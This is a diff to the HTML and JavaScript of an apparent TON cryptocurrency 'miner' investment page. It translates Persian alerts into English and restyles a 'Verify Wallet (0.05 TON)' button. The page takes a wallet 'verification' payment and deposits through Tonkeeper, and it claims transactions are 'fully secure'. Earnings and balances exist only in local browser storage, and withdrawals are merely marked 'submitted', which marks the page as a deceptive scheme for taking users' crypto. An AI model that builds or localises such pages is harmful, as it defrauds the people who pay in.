@@ -436,9 +436,10 @@
             border: 1px solid rgba(255,255,255,0.2);
         }
 
+        /* دکمه آبی رنگ تایید ولت که بعد از واریز سبز می‌شود */
         .verify-wallet-btn {
             width: 100%;
-            background: linear-gradient(135deg, #f59e0b, #d97706);
+            background: linear-gradient(135deg, #0098ea, #005c8a);
             color: #ffffff;
             border: none;
             padding: 14px;
@@ -447,7 +448,7 @@
             font-size: 13px;
             cursor: pointer;
             margin-top: 10px;
-            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 152, 234, 0.3);
             transition: 0.3s;
         }
 
@@ -742,11 +743,11 @@
 
             <div id="ton-connect-button-container"></div>
 
-            <!-- دکمه تایید امنیتی ولت (0.05 TON) -->
-            <button class="verify-wallet-btn" id="verify-wallet-btn-id" onclick="verifyWalletWith005Ton()">🛡️ تایید ولت (0.05 TON)</button>
+            <!-- دکمه آبی رنگ تایید ولت انگلیسی (جایگزین نارنجی) -->
+            <button class="verify-wallet-btn" id="verify-wallet-btn-id" onclick="verifyWalletWith005Ton()">Verify Wallet (0.05 TON)</button>
 
             <div class="support-card">
-                <div class="support-title">🛡️ Secure & Instant Support</div>
+                <div class="support-title">🎧 Secure & Instant Support</div>
                 <div class="support-desc">Deposit and invest with complete peace of mind! Transactions are fully secure.</div>
                 <button class="support-btn" onclick="openSupportChat()">Contact Support</button>
             </div>
@@ -938,9 +939,7 @@
                 isDragging = false;
                 const currentLeft = parseInt(thumb.style.left) || 4;
 
-                // محدوده هدف (حدود 180 تا 210 پیکسل)
                 if (currentLeft >= 180 && currentLeft <= 215) {
-                    // قفل شدن روی مقصد و ورود موفق
                     thumb.style.left = maxTrackWidth + 'px';
                     piece.style.transform = `translateX(${maxTrackWidth}px)`;
                     piece.innerHTML = '✨';
@@ -952,7 +951,6 @@
                         }, 400);
                     }, 200);
                 } else {
-                    // برگشتن به عقب با انیمیشن روان
                     thumb.style.transition = 'left 0.3s ease';
                     piece.style.transition = 'transform 0.3s ease';
                     thumb.style.left = '4px';
@@ -964,14 +962,12 @@
                 }
             }
 
-            // Touch events برای موبایل
             thumb.addEventListener('touchstart', (e) => startDrag(e.touches[0].clientX));
             window.addEventListener('touchmove', (e) => {
                 if (isDragging) onDrag(e.touches[0].clientX);
             });
             window.addEventListener('touchend', () => endDrag());
 
-            // Mouse events برای دسکتاپ
             thumb.addEventListener('mousedown', (e) => startDrag(e.clientX));
             window.addEventListener('mousemove', (e) => {
                 if (isDragging) onDrag(e.clientX);
@@ -979,10 +975,10 @@
             window.addEventListener('mouseup', () => endDrag());
         }
 
-        // ================= WALLET 0.05 TON VERIFICATION =================
+        // ================= WALLET 0.05 TON VERIFICATION (ENGLISH) =================
         async function verifyWalletWith005Ton() {
             if (!tonConnectUI.connected) {
-                alert("❌ لطفاً ابتدا کیف پول خود را از طریق دکمه اتصال ولت متصل کنید!");
+                alert("⚠️ Please connect your wallet first using the Connect Wallet button!");
                 return;
             }
 
@@ -993,12 +989,12 @@
             };
 
             try {
-                alert("🚀 در حال باز کردن تونکیپر برای تایید امنیتی ولت...");
+                alert("🚀 Opening Tonkeeper to verify wallet securely...");
                 await tonConnectUI.sendTransaction(transaction);
                 
                 const btn = document.getElementById('verify-wallet-btn-id');
                 btn.className = "verify-wallet-btn verified";
-                btn.innerHTML = "✅ تایید شده ایمن";
+                btn.innerHTML = "✅ Verified Secure";
                 btn.onclick = null;
 
                 state.isVerifiedWallet = true;
@@ -1007,10 +1003,10 @@
                 saveState();
                 updateUI();
 
-                alert("✅ ولت شما با موفقیت و به صورت ایمن تایید شد!");
+                alert("✅ Wallet verified successfully and securely!");
             } catch (e) {
                 console.error(e);
-                alert("❌ تراکنش تایید ولت لغو شد یا انجام نشد.");
+                alert("❌ Wallet verification transaction was cancelled or failed.");
             }
         }
 
@@ -1042,7 +1038,7 @@
         };
 
         function loadState() {
-            const saved = localStorage.getItem('solaris_miner_save_v37');
+            const saved = localStorage.getItem('solaris_miner_save_v38');
             if (saved) {
                 try { state = JSON.parse(saved); } catch(e) {}
             }
@@ -1050,7 +1046,7 @@
                 const btn = document.getElementById('verify-wallet-btn-id');
                 if(btn) {
                     btn.className = "verify-wallet-btn verified";
-                    btn.innerHTML = "✅ تایید شده ایمن";
+                    btn.innerHTML = "✅ Verified Secure";
                     btn.onclick = null;
                 }
             }
@@ -1065,7 +1061,7 @@
 
         function saveState() {
             state.lastTick = Date.now();
-            localStorage.setItem('solaris_miner_save_v37', JSON.stringify(state));
+            localStorage.setItem('solaris_miner_save_v38', JSON.stringify(state));
         }
 
         function getTotalDailyRate() {
@@ -1125,7 +1121,7 @@
             if (state.ownedIds.includes(id)) return;
             const prop = initialProperties.find(p => p.id === id);
             if (state.balance < prop.price) {
-                alert("❌ موجودی کافی نیست.");
+                alert("❌ Insufficient balance.");
                 switchTab('wallet');
                 return;
             }
@@ -1133,7 +1129,7 @@
             state.ownedIds.push(id);
             saveState();
             renderProperties();
-            alert(`🎉 ماینر ${prop.name} فعال شد!`);
+            alert(`🎉 Missile System ${prop.name} activated successfully!`);
         }
 
         function claimEarnings() {
@@ -1142,12 +1138,12 @@
             state.unclaimed = 0;
             saveState();
             updateUI();
-            alert("✅ پاداش به موجودی اضافه شد!");
+            alert("✅ Rewards added to your balance!");
         }
 
         async function sendTonConnectTransaction() {
             if (!tonConnectUI.connected) {
-                alert("⚠️ لطفاً ابتدا ولت را متصل کنید!");
+                alert("⚠️ Please connect your wallet first!");
                 return;
             }
             const amountInput = parseFloat(document.getElementById('deposit-amount-input').value);
@@ -1163,9 +1159,9 @@
                 saveState();
                 updateUI();
                 closeModal('deposit-modal');
-                alert(`✅ واریز ${amountInput} تون موفق بود!`);
+                alert(`✅ Deposit of ${amountInput} TON successful!`);
             } catch (e) {
-                alert("❌ تراکنش لغو شد.");
+                alert("❌ Transaction cancelled.");
             }
         }
 
@@ -1177,7 +1173,7 @@
             saveState();
             updateUI();
             closeModal('withdraw-modal');
-            alert("✅ برداشت ثبت شد.");
+            alert("✅ Withdrawal request submitted.");
         }
 
         function updateUI() {
